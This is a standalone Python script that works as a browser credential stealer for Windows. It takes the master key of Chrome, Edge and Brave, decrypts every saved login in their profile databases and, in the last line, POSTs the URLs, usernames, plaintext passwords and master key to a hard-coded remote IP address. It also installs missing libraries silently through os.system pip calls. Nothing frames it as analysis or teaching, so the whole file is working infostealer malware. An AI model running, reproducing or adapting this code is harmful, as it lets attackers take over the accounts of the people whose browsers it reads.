import os, json, base64, sqlite3, shutil, tempfile
try:
    import win32crypt
except ImportError:
    os.system("pip install pywin32")
    import win32crypt
try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests

from Crypto.Cipher import AES

def get_master_key(browser_path: str) -> bytes:
    local_state_path = os.path.join(browser_path, "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]


def decrypt_password(password_value: bytes, master_key: bytes) -> str:
    try:
        if password_value[:3] in (b"v10", b"v11"):
            nonce      = password_value[3:15]
            ciphertext = password_value[15:-16]
            tag        = password_value[-16:]
            cipher     = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8")
        else:
            return win32crypt.CryptUnprotectData(
                password_value, None, None, None, 0
            )[1].decode("utf-8")
    except Exception:
        return "[decryption failed]"


def extract_credentials(profile_path: str, master_key: bytes) -> list[dict]:
    login_data_src = os.path.join(profile_path, "Login Data")

    # Chrome locks the DB while running — copy it to a temp location
    tmp = tempfile.mktemp(suffix=".db")
    shutil.copy2(login_data_src, tmp)

    results = []
    conn = sqlite3.connect(tmp)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    for url, username, password_value in cursor.fetchall():
        if password_value[:3] == b"v10" or password_value[:3] == b"v11":
            decrypted = decrypt_password(password_value, master_key)
        else:
            # Legacy DPAPI path
            try:
                decrypted = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1].decode("utf-8")
            except Exception:
                decrypted = "[decryption failed]"
        if decrypted :
            results.append({
                "master_key": master_key.decode("utf-8", errors="ignore"),
                "url": url,
                "username": username,
                "password_value": password_value,
                "decrypted": decrypted.decode("utf-8") if isinstance(decrypted, bytes) else decrypted
            })

    conn.close()
    os.remove(tmp)
    return results


# --- Entry point ---
BROWSERS = {
    "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
    "Edge":   os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
    "Brave":  os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data"),
}

if __name__ == "__main__":
    all_results = []
    for browser_name, browser_path in BROWSERS.items():
        if not os.path.exists(browser_path):
            continue
        master_key = get_master_key(browser_path)
        creds = extract_credentials(os.path.join(browser_path, "Default"), master_key)
        all_results.extend(creds)
    requests.post("http://172.25.206.179:9003/random-m3d", json=json.dumps(str({"m3d": all_results})))
